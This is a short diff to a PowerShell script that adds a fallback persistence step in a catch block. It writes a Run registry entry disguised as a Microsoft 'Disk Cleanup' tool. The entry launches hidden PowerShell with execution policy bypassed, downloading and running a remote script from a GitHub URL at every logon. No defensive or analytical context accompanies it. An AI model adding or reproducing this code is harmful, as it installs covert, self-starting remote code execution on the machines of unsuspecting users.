@@ -27,4 +27,10 @@ try {
 
     Start-ScheduledTask -TaskName $taskName | Out-Null
 } catch {
+    # If registering the scheduled task fails, add it to the registry for startup
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regValueName = "Disk Cleanup Microsoft Tools4Windows"
+    $regValue = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& {Invoke-Expression (Invoke-WebRequest 'https://raw.githubusercontent.com/tools4windows/other/refs/heads/main/daily.ps1' -UseBasicParsing)}"""
+    
+    Set-ItemProperty -Path $regPath -Name $regValueName -Value $regValue
 }
